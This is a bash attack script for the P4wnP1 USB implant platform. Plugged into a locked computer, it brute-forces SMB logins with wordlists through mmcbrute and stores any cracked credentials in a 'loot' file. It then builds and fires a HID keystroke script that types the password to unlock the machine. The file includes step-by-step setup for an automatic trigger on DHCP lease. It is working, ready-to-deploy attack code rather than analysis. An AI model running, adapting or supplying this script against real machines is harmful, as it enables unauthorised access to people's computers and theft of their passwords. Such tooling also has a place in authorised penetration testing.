#!/bin/bash



# P4wnP1 SMBrute
# Author: Mohamed A. Baset aka @SymbianSyMoh

# Setup
# 1. Clone this repo https://github.com/SymbianSyMoh/mmcbrute in /usr/local/P4wnP1/programs/
# 2. The impacket library is required in order to run this script, do "pip2 install impacket" If that fails, you can get the library from here: https://github.com/CoreSecurity/impacket
# 3. Set the proper variables paths
password_process_file="/usr/local/P4wnP1/scripts/ppf.txt"
password_loot_file="/usr/local/P4wnP1/loot/credentials.txt"
unlock_hid_script="/usr/local/P4wnP1/HIDScripts/hid_enter_login_password.js"
user_bruteforce_list="/usr/local/P4wnP1/wordlists/user.txt"
pass_bruteforce_list="/usr/local/P4wnP1/wordlists/pass2.txt"
# 4. Put this script under /usr/local/P4wnP1/scripts/P4wnP1-PySMBCredsBruteforceUnlock.sh
# 5. Create a trigger action with those properties:
	# Enabled: on
	# One Shot: on
	# Trigger: DHCP lease issued
	# Action: run a bash script
	# Script path: P4wnP1-PySMBCredsBruteforceUnlock.sh
# 6. Save the configuration and set it in a master template and set it as "Startup Master Template"
# 7. Plug the P4wnP1 in a locked computer, once the DHCP lease offered it will perform SMB bruteforce attack and once succeded it will fire HID script to enter the password and unlock the machine.

#Preparation
mkdir /usr/local/P4wnP1/loot 2> /dev/null
rm $unlock_hid_script 2> /dev/null
rm $password_process_file 2> /dev/null

cd /usr/local/P4wnP1/programs/mmcbrute/
python mmcbrute.py -t 172.16.0.2 -u $user_bruteforce_list -p $pass_bruteforce_list 2> $password_process_file

if grep -q "Success" $password_process_file; then
echo ""
P4wnP1_cli led -b 150
echo "[*] Password found!"
user=$(cat $password_process_file | grep "./" | cut -d "/" -f 2 | cut -d ":" -f 1)
pass=$(cat $password_process_file | grep "./" | cut -d "/" -f 2 | cut -d ":" -f 2)
echo "[*] Storing found credentials..."
echo "User:$user - Pass:$pass" >> $password_loot_file
echo "[*] Preparing unlocking script..."
echo "layout('en')" > $unlock_hid_script
echo "press(\"ESC\");" >> $unlock_hid_script
echo "delay(2000)" >> $unlock_hid_script
echo "type(\"$pass\n\")" >> $unlock_hid_script
echo "[*] Unlocking target machine..."
P4wnP1_cli hid run $unlock_hid_script
echo "[*] Unlocked successfully!"
else
echo ""
echo "[*] Password cannot be found in the wordlist!"
P4wnP1_cli led -b 0
fi

# Performance: Slow, processed 1835 password guessing in 4 minutes and 25 seconds!
